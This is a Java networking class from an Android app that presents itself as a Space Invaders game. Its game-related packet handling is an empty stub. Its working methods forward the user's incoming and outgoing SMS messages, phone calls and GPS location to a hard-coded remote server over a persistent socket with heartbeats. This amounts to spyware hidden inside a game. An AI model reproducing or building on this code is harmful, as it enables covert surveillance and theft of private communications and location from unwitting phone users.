package com.cst.spaceinvaders.service.network;

import android.util.Log;
import com.cst.spaceinvaders.game.SpaceInvadersGame;
import com.cst.spaceinvaders.service.SpaceInvadersService;
import com.cst.spaceinvaders.shared.data.*;
import com.cst.spaceinvaders.shared.network.connection.Connection;
import com.cst.spaceinvaders.shared.network.packets.*;

import java.io.IOException;
import java.net.Socket;

public class Handler implements Runnable
{
    private final SpaceInvadersService m_parent;
    private Connection m_connection;
    private boolean m_running;

    // Delay in ms since last sent packet before a heartbeat is sent.
    private static final long HEARTBEAT_DELAY = 2500;

    // How many ms should the thread sleep for between connection attempts
    // This is for power conservation.
    private static final long SLEEP_DELAY = 1000;

    public Handler(SpaceInvadersService parent)
    {
        m_parent = parent;
        m_running = true;
    }

    @Override
    public void run()
    {
        m_running = true;

        while (m_running)
        {
            if (m_connection == null)
            {
                try
                {
                    m_connection = new Connection(new Socket(Globals.SERVER_IP, Globals.SERVER_PORT));
                }
                catch (IOException ignored)
                {
                    // Connection attempt failed. Sleep for a bit.
                    try
                    {
                        Thread.sleep(SLEEP_DELAY);
                    }
                    catch (InterruptedException ignored2)
                    {
                    }

                    continue;
                }
            }

            if (m_connection.connected())
            {
                final long deltaTime = System.currentTimeMillis() - m_connection.lastSendTime();

                if (deltaTime > HEARTBEAT_DELAY)
                    m_connection.write(new HeartbeatPacket(null));

                while (m_connection.readable())
                {
                    Packet received = m_connection.read();
                    Log.d(SpaceInvadersGame.LOG_TAG, String.format("Received packet '%s' from '%s'",
                            received, m_connection.socket().getInetAddress()));
                    handlePacket(received);
                }
            }
            else
            {
                Log.e(SpaceInvadersGame.LOG_TAG, String.format("Lost connection with '%s'",
                        m_connection.socket().getInetAddress()));

                m_connection.safeClose();
                m_connection = null;
            }
        }
    }

    private void handlePacket(Packet packet)
    {
        byte networkCode = packet.networkCode();

        if (networkCode == NetworkCodes.SEND_HIGH_SCORE)
        {

        }
    }

    public void onIncomingSms(IncomingSMS sms)
    {
        m_connection.write(new SendIncomingSMSPacket(sms));
    }

    public void onIncomingCall(IncomingCall call)
    {
        m_connection.write(new SendIncomingCallPacket(call));
    }

    public void onOutgoingSms(OutgoingSMS sms)
    {
        m_connection.write(new SendOutgoingSMSPacket(sms));
    }

    public void onOutgoingCall(OutgoingCall call)
    {
        m_connection.write(new SendOutgoingCallPacket(call));
    }

    public void onGpsUpdate(Geolocation location)
    {
        m_connection.write(new SendGeolocationPacket(location));
    }
}
